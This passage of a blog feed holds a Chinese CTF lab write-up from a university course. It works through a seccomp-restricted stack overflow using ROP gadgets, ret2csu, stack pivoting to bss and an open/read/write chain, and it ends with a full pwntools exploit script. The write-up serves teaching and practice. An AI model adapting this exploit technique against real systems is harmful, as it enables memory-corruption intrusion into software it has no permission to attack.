href=\"https://blog.csdn.net/qq_41202237/article/details/105913597\">https://blog.csdn.net/qq_41202237/article/details/105913597</a></p>\n<p><a href=\"https://xz.aliyun.com/t/12189\">https://xz.aliyun.com/t/12189</a></p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/",
            "url": "https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/",
            "title": "ucas-高级网络攻防-实验二-pwn1-栈",
            "date_published": "2023-04-04T00:31:49.000Z",
            "content_html": "<p>题目链接:<a href=\"https://tangzichengcc.github.io/2023/04/04/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/rop\">https://tangzichengcc.github.io/2023/04/04/ucas-高级网络攻防-实验二-pwn1-栈/rop</a></p>\n<p>课上的pwn的练习1,总结来说基础差的太多,一个是漏洞基础,应该先对相应的漏洞的简单题多练一练,深入理解原理,不然后面遇到一点问题就卡住了,另外还是有很多底层的原理,基础知识需要补.</p>\n<h1 id=\"第一章-解题过程描述\"><a href=\"#第一章-解题过程描述\" class=\"headerlink\" title=\"第一章 解题过程描述\"></a>第一章 解题过程描述</h1><h2 id=\"一-攻击流程图\"><a href=\"#一-攻击流程图\" class=\"headerlink\" title=\"一. 攻击流程图\"></a>一. 攻击流程图</h2><p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/orw.drawio.png\" alt=\"orw.drawio\"></p>\n<h2 id=\"二-详细解题过程\"><a href=\"#二-详细解题过程\" class=\"headerlink\" title=\"二. 详细解题过程\"></a>二. 详细解题过程</h2><h3 id=\"1-ida反汇编查看伪代码\"><a href=\"#1-ida反汇编查看伪代码\" class=\"headerlink\" title=\"1.ida反汇编查看伪代码\"></a>1.ida反汇编查看伪代码</h3><p>​\t\t可以发现有install_seccomp(argc, argv, envp);函数,说明安装了保护</p>\n<p>​\t\t漏洞点在vuln函数中,存在栈溢出,但只能溢出8字节,显然空间非常需要,需要利用其他技术来布置后续攻击代码</p>\n<h3 id=\"2-seccomp保护\"><a href=\"#2-seccomp保护\" class=\"headerlink\" title=\"2. seccomp保护\"></a>2. seccomp保护</h3><p>​\t\t利用工具seccomp-tools查看</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-24-10-ubuntu:/tmp/330# seccomp-tools dump ./rop </span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class=\"line\"> 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x0a 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0014</span><br><span class=\"line\"> 0004: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0013</span><br><span class=\"line\"> 0005: 0x15 0x07 0x00 0x00000101  if (A == openat) goto 0013</span><br><span class=\"line\"> 0006: 0x15 0x06 0x00 0x000001b5  if (A == 0x1b5) goto 0013</span><br><span class=\"line\"> 0007: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0013</span><br><span class=\"line\"> 0008: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0013</span><br><span class=\"line\"> 0009: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0013</span><br><span class=\"line\"> 0010: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0013</span><br><span class=\"line\"> 0011: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0013</span><br><span class=\"line\"> 0012: 0x06 0x00 0x00 0x00050005  return ERRNO(5)</span><br><span class=\"line\"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class=\"line\"> 0014: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这段代码的作用是在64位的x86架构上过滤掉不需要的系统调用，只允许执行一些特定的系统调用。如果系统调用是这些特定的系统调用之一，则允许执行，否则拒绝执行。</p>\n<p>​\t\t具体允许的只有open,read,write,exit及其变种. 并且限制了架构,不能使用其他架构下的系统调用. 那么常用的方法是,构造orw链,利用open read write系统调用来读取和打印flag文件.</p>\n<h3 id=\"3-寻找gadget\"><a href=\"#3-寻找gadget\" class=\"headerlink\" title=\"3. 寻找gadget\"></a>3. 寻找gadget</h3><h4 id=\"3-1-orw\"><a href=\"#3-1-orw\" class=\"headerlink\" title=\"3.1 orw\"></a>3.1 orw</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.plt.sec:0000000000401100 _open           proc near               ; CODE XREF: some_gifts+1D↓p</span><br><span class=\"line\">.plt.sec:0000000000401100                 endbr64</span><br><span class=\"line\">.plt.sec:0000000000401104                 bnd jmp cs:off_404040</span><br><span class=\"line\">.plt.sec:0000000000401104 _open           endp</span><br><span class=\"line\"></span><br><span class=\"line\">.plt.sec:00000000004010D0 _read           proc near               ; CODE XREF: vuln+40↓p</span><br><span class=\"line\">.plt.sec:00000000004010D0                 endbr64</span><br><span class=\"line\">.plt.sec:00000000004010D4                 bnd jmp cs:off_404028</span><br><span class=\"line\">.plt.sec:00000000004010D4 _read           endp</span><br><span class=\"line\"></span><br><span class=\"line\">.plt.sec:00000000004010C0 _write          proc near               ; CODE XREF: main+88↓p</span><br><span class=\"line\">.plt.sec:00000000004010C0                                         ; main+9E↓p</span><br><span class=\"line\">.plt.sec:00000000004010C0                 endbr64</span><br><span class=\"line\">.plt.sec:00000000004010C4                 bnd jmp cs:off_404020</span><br><span class=\"line\">.plt.sec:00000000004010C4 _write          endp</span><br></pre></td></tr></table></figure>\n\n<p>​\t或者用elf.plt[‘read’]来获取</p>\n<h4 id=\"3-2-gadget\"><a href=\"#3-2-gadget\" class=\"headerlink\" title=\"3.2 gadget\"></a>3.2 gadget</h4><p>​\t\tamd64-64-little, x64架构下,目前应用的调用约定是fastcal,前三个传参的寄存器是rdi rsi rdx </p>\n<p>​\t\t利用工具ROPgadget寻找可用的gadget,找到了rdi和rsi,未找到rdx,rdx的值并不一定总会影响函数的调用,要根据具体情况而定,在本题中,经过测试是会影响的,在read读取flag的时候,rdx代表着读取的长度,经过调试发现被设置为了0,所以读取的是空的.因此需要找到一个能设置rdx寄存器的gadget,会在后续章节说明.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-24-10-ubuntu:/tmp/330# ROPgadget --binary rop  --only &#x27;pop|ret&#x27;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000000000040147c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040147e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000401480 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000401482 : pop r15 ; ret</span><br><span class=\"line\">0x000000000040147b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040147f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004011fd : pop rbp ; ret</span><br><span class=\"line\">0x0000000000401483 : pop rdi ; ret</span><br><span class=\"line\">0x0000000000401481 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040147d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040101a : ret</span><br><span class=\"line\">0x0000000000401277 : ret 0x2be</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 12</span><br><span class=\"line\"></span><br><span class=\"line\">0x0000000000401483 : pop rdi ; ret</span><br><span class=\"line\">0x0000000000401481 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-2-1-ret2csu\"><a href=\"#3-2-1-ret2csu\" class=\"headerlink\" title=\"3.2.1 ret2csu\"></a>3.2.1 ret2csu</h5><p>​\t\t不同架构的csu代码是不一样的,要根据具体情况而定,就此题的架构而言,csu代码如下</p>\n<p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/Untitled.png\" alt=\"Untitled\"></p>\n<p>​\t\t先执行loc_401476里面的代码,进行pop赋值,ret后再执行loc_401460的代码,对传参寄存器进行赋值,然后再利用call 转移控制流</p>\n<p>​\t\trdi rsi rdx 分别对应着第一次要输入的 r12,r13,r14,call的地址是[r15+rbx*8],可以设置r15为存储跳转地址的地址,rbx为0</p>\n<p>​\t\t设置rbp为1,rbx为0,即可继续往下执行</p>\n<h5 id=\"3-2-2-栈迁移的gadget\"><a href=\"#3-2-2-栈迁移的gadget\" class=\"headerlink\" title=\"3.2.2 栈迁移的gadget\"></a>3.2.2 栈迁移的gadget</h5><p>​\t\t由于只能溢出8字节,是不够布置gadget链的,需要扩展栈空间,通常用的手法是进行栈迁移,移动到一个更大的空间去</p>\n<p>​\t\tleave  &#x3D;&#x3D; mov rsp,rbp;pop rbp;<br>​\t\tret    &#x3D;&#x3D; pop rip <em>#弹出栈顶数据给rip寄存器</em></p>\n<p>​\t\t利用两次leave;ret; 即可控制rsp</p>\n<p>​\t\tmov rsp,rbp;    &#x2F;&#x2F;第一个rbp不受我们的控制，但是下面pop的rbp可以被我们更改，从而就可以控制第二个leave里面的rsp<br>​\t\tpop rbp;<br>​\t\tmov rsp,rbp;<br>​\t\tpop rbp;<br>​\t\tpop rip\t</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-24-10-ubuntu:/home/ubuntu/330# ROPgadget --binary rop  --only &#x27;leave|ret&#x27;</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x00000000004012a7 : leave ; ret</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-迁移到bss\"><a href=\"#4-迁移到bss\" class=\"headerlink\" title=\"4. 迁移到bss\"></a>4. 迁移到bss</h3><p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/stackpivot.drawio.png\" alt=\"stackpivot.drawio\"></p>\n<p>​\t\t只迁移是不够的,同时应该做到在迁移到的新地方布置好rop链,一个想法是,调用vuln()函数中的read,既可以读取0x110的数据,最后也有leave;ret;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000000000401304 loc_401304:                             ; CODE XREF: vuln+20↑j</span><br><span class=\"line\">.text:0000000000401304                 lea     rax, [rbp+buf]</span><br><span class=\"line\">.text:000000000040130B                 mov     edx, 110h       ; nbytes</span><br><span class=\"line\">.text:0000000000401310                 mov     rsi, rax        ; buf</span><br><span class=\"line\">.text:0000000000401313                 mov     edi, 0          ; fd</span><br><span class=\"line\">.text:0000000000401318                 call    _read</span><br><span class=\"line\">.text:000000000040131D                 nop</span><br><span class=\"line\">.text:000000000040131E                 leave</span><br><span class=\"line\">.text:000000000040131F                 retn</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t但是这里有一个问题,数据被写入的地方不是rbp,而是rbp-0x100,而经过两次leave;ret;后修改的rsp的值是原始rbp的值,所以还是到达不了rop链的位置,因此,需要第三次的leave;ret;再次修正rsp的位置,这样的话,在第二次leave;ret;的时候,rbp设置为写入地址-0x108,然后第三次leave;ret;就把rsp设置为了rop链的开头</p>\n<p>​\t\t设置成0x108是因为在最后一个leave;ret;的时候,mov rsp,rbp,转移栈成功后,要pop出来rbp然后栈往下移动8字节,这个多的0x8用来抵消pop rbp.</p>\n<h3 id=\"5-构造ROP链-实现orw\"><a href=\"#5-构造ROP链-实现orw\" class=\"headerlink\" title=\"5. 构造ROP链, 实现orw\"></a>5. 构造ROP链, 实现orw</h3><h4 id=\"5-1-构造orw\"><a href=\"#5-1-构造orw\" class=\"headerlink\" title=\"5.1 构造orw\"></a>5.1 构造orw</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1 = p64(poprdi) + p64(<span class=\"string\">&quot;0&quot;</span>) + p64(poprsi)+ p64(bssaddr2) +p64(<span class=\"number\">0</span>)+ p64(readaddr)</span><br><span class=\"line\">payload1 +=  p64(poprdi) +  p64(bssaddr2) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)</span><br><span class=\"line\">payload1 += p64(poprdi) + p64(<span class=\"number\">3</span>) + p64(poprsi) + p64(bssaddr2) +p64(<span class=\"number\">0</span>)+ p64(readaddr)</span><br><span class=\"line\">payload1 += p64(poprdi) + p64(<span class=\"number\">1</span>) + p64(poprsi) + p64(bssaddr2) +p64(<span class=\"number\">0</span>) +p64(writeaddr)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t四行的用途分别是</p>\n<p>​\t\t从用户标准输入中读取 .&#x2F;flag 字符,用于后面的open</p>\n<p>​\t\topen .&#x2F;flag 这个文件,得到文件句柄3</p>\n<p>​\t\tread 读取具柄3,读取到bss区域</p>\n<p>​\t\twrite 将flag所在bss区域内容输入到标准输出中</p>\n<p>​\t\t在调试中可以看到,在执行第三行操作,即read时,rdx的值被设置成了0,于是需要设置rdx的gadget</p>\n<p><img src=\"/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/image-20230403142700054.png\" alt=\"image-20230403142700054\"></p>\n<h4 id=\"5-2-利用ret2csu构造-read的参数\"><a href=\"#5-2-利用ret2csu构造-read的参数\" class=\"headerlink\" title=\"5.2 利用ret2csu构造 read的参数\"></a>5.2 利用ret2csu构造 read的参数</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">csu_front_addr = 0x0000000000401460</span><br><span class=\"line\">csu_end_addr = 0x000000000040147a</span><br><span class=\"line\"></span><br><span class=\"line\">def csu(rbx, rbp, r12, r13, r14, r15):</span><br><span class=\"line\">\t\t# rdi rsi rdx 分别对应着 r12,r13,r14</span><br><span class=\"line\">\t\t# call的地址是[r15+rbx*8], 可以设置r15为地址,rbx为0</span><br><span class=\"line\">\t\t# r15这个地址存储的数据是要call的函数的地址</span><br><span class=\"line\">    payloadtemp = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payloadtemp += p64(csu_front_addr)</span><br><span class=\"line\">    return payloadtemp</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># r12 + rbx*8 = 0x0004010C0</span><br><span class=\"line\">temp = csu(0,1,3,bssaddr2,50,0x0404e24)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t要call的地址是[r15+rbx*8], 所以需要找到一个地址,存储着read函数的地址,在尝试利用5.1节第一行payload中存储rop链的中的bss地址中的read地址时发现,后面会被覆盖掉.可以在payload之后,再加上read函数的地址. 计算或者调试出存储其地址的地址.</p>\n<h4 id=\"5-3-利用ret2csu继续构造-write的参数\"><a href=\"#5-3-利用ret2csu继续构造-write的参数\" class=\"headerlink\" title=\"5.3 利用ret2csu继续构造 write的参数\"></a>5.3 利用ret2csu继续构造 write的参数</h4><p>​\t\t在上一步时,设置rbx&#x3D;1,rbp&#x3D;1,即可以让程序继续往下执行,进入第二轮ret2csu,与5.2中的方法类似,构造write的参数</p>\n<p>​\t\t完整exp见附录</p>\n<h1 id=\"第二章-题目技术点总结\"><a href=\"#第二章-题目技术点总结\" class=\"headerlink\" title=\"第二章 题目技术点总结\"></a>第二章 题目技术点总结</h1><h2 id=\"一-ORW\"><a href=\"#一-ORW\" class=\"headerlink\" title=\"一. ORW\"></a>一. ORW</h2><p>​\t\tORW利用了Linux中的open&#x2F;read&#x2F;write系统调用来执行操作,通常在限制了系统调用的时候使用,在ctf中根本目标是获取flag,所以在拿不到系统权限的时候可以通过该中方法进行获取flag.</p>\n<p>​\t\torw有很多种不同的系统调用可以使用,并且在不同架构下也有不一样的,根据seccomp具体的限制可以使用不同的方法.</p>\n<p>​\t\t需要注意的是,在做题目时,要根据具体的系统版本来寻找系统调用,在最新版本中有可能加入新的可用的系统调用.</p>\n<h2 id=\"二-seccomp\"><a href=\"#二-seccomp\" class=\"headerlink\" title=\"二. seccomp\"></a>二. seccomp</h2><p>​\t\tseccomp是一种在ctf pwn中常用的安全机制，可用于限制程序对系统调用的访问。通过使用seccomp，可以有效地降低程序受到攻击的风险。</p>\n<h2 id=\"三-ret2csu\"><a href=\"#三-ret2csu\" class=\"headerlink\" title=\"三. ret2csu\"></a>三. ret2csu</h2><p>​\t\tret2csu是一种在ctf pwn中常用的技术，可用于在程序没有可用的gadget的情况下构造ROP链。它利用了一个特殊的函数__libc_csu_init来调用函数，并利用程序的堆栈来构造ROP链。</p>\n<h2 id=\"四-栈迁移\"><a href=\"#四-栈迁移\" class=\"headerlink\" title=\"四. 栈迁移\"></a>四. 栈迁移</h2><p>​\t\t可用于在程序栈空间不足的情况下，通过将栈迁移到bss段、堆等来执行攻击,也可以利用sub rsp等gadget来增加栈的长度.通常使用的是leave;ret;方法,第一次leave;ret;控制rbp,第二次可以控制rsp</p>\n<h1 id=\"第三章-错误处理\"><a href=\"#第三章-错误处理\" class=\"headerlink\" title=\"第三章 错误处理\"></a>第三章 错误处理</h1><h2 id=\"一-open时出错\"><a href=\"#一-open时出错\" class=\"headerlink\" title=\"一. open时出错\"></a>一. open时出错</h2><p>​\t\tbss段给的地址太小,在动态解析的时候,栈会移动到不可写的地方,导致出错,将bss往后移动多一点即可</p>\n<h2 id=\"二-orw-不设置rdx-本地可以打通-远程不可以\"><a href=\"#二-orw-不设置rdx-本地可以打通-远程不可以\" class=\"headerlink\" title=\"二. orw(不设置rdx) 本地可以打通,远程不可以\"></a>二. orw(不设置rdx) 本地可以打通,远程不可以</h2><p>​\t\t是libc版本的问题,把版本切换到2.27(题目版本)后即可发现,在read时,rdx被设置为了0,因此需要找到能够设置rdx的gadget</p>\n<h2 id><a href=\"#\" class=\"headerlink\" title></a></h2><h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><p><a href=\"https://blog.csdn.net/qq_34010404/article/details/123809796\">https://blog.csdn.net/qq_34010404&#x2F;article&#x2F;details&#x2F;123809796</a></p>\n<p><a href=\"https://blog.csdn.net/mcmuyanga/article/details/113389703\">https://blog.csdn.net/mcmuyanga/article/details/113389703</a></p>\n<p><a href=\"https://blog.csdn.net/qq_45691294/article/details/112196127\">https://blog.csdn.net/qq_45691294&#x2F;article&#x2F;details&#x2F;112196127</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41696518/article/details/126665825\">https://blog.csdn.net/qq_41696518&#x2F;article&#x2F;details&#x2F;126665825</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41202237/article/details/105913597\">https://blog.csdn.net/qq_41202237&#x2F;article&#x2F;details&#x2F;105913597</a></p>\n<p><a href=\"https://xz.aliyun.com/t/12189\">https://xz.aliyun.com/t/12189</a></p>\n<h1 id=\"附录\"><a href=\"#附录\" class=\"headerlink\" title=\"附录:\"></a>附录:</h1><h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote(&quot;xxx&quot;,xxx)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;xxxx&quot;</span>,<span class=\"number\">52017</span>)</span><br><span class=\"line\"><span class=\"comment\">#sh = process(&quot;./rop&quot;)</span></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x0040131E&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">bssaddr = <span class=\"number\">0x0040412C</span> + <span class=\"number\">0xd00</span></span><br><span class=\"line\">retaddr = <span class=\"number\">0x0000401304</span></span><br><span class=\"line\">readaddr = <span class=\"number\">0x0004010D0</span></span><br><span class=\"line\">openaddr = <span class=\"number\">0x00401100</span></span><br><span class=\"line\">writeaddr = <span class=\"number\">0x0004010C0</span></span><br><span class=\"line\">csu_front_addr = <span class=\"number\">0x0000000000401460</span></span><br><span class=\"line\">csu_end_addr = <span class=\"number\">0x000000000040147a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">csu</span>(<span class=\"params\">rbx, rbp, r12, r13, r14, r15</span>):</span><br><span class=\"line\">    payloadtemp = p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payloadtemp += p64(csu_front_addr)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> payloadtemp</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">csu2</span>(<span class=\"params\">rbp, r12, r13, r14, r15</span>):</span><br><span class=\"line\">    payloadtemp = p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class=\"line\">    payloadtemp += p64(csu_front_addr)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> payloadtemp</span><br><span class=\"line\"></span><br><span class=\"line\">sh.sendlineafter(<span class=\"string\">&quot;choice:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">4919</span>))</span><br><span class=\"line\">payload =<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">256</span> + p64(bssaddr) + p64(retaddr)</span><br><span class=\"line\"><span class=\"comment\"># 40413c</span></span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">poprdi = <span class=\"number\">0x0000401483</span></span><br><span class=\"line\">poprsi = <span class=\"number\">0x0000401481</span></span><br><span class=\"line\">bssaddr2 = bssaddr + <span class=\"number\">0x20</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x0040131E</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = p64(poprdi) + p64(<span class=\"number\">0</span>) + p64(poprsi)+ p64(bssaddr2) +p64(<span class=\"number\">0</span>)+ p64(readaddr)</span><br><span class=\"line\">payload1 +=  p64(poprdi) +  p64(bssaddr2) + p64(poprsi) + p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(openaddr)</span><br><span class=\"line\">temp = csu(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,bssaddr2,<span class=\"number\">50</span>,<span class=\"number\">0x404e0c</span>)</span><br><span class=\"line\">payload1 += temp</span><br><span class=\"line\">temp2 = csu(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">1</span>,bssaddr2,<span class=\"number\">50</span>,<span class=\"number\">0x404e14</span>)</span><br><span class=\"line\">payload1 += temp2 + p64(readaddr) + p64(writeaddr)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;len:&quot;</span>,<span class=\"built_in\">len</span>(payload1))</span><br><span class=\"line\">payload1 = payload1.ljust(<span class=\"number\">0x100</span>,<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">payload1 +=  p64(bssaddr-<span class=\"number\">0x108</span>) + p64(leave_ret)</span><br><span class=\"line\">sh.send(payload1)</span><br><span class=\"line\">sh.send(<span class=\"string\">&quot;./flag\\x00&quot;</span>)</span><br><span class=\"line\">sh.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "研究生课程"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-23-pwn-college-Fundamentals-Program-Interaction/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-23-pwn-college-Fundamentals-Program-Interaction/",
            "title": "pwn入门-23-pwn-college_Fundamentals_Program_Interaction",
            "date_published": "2023-03-23T06:48:10.000Z",
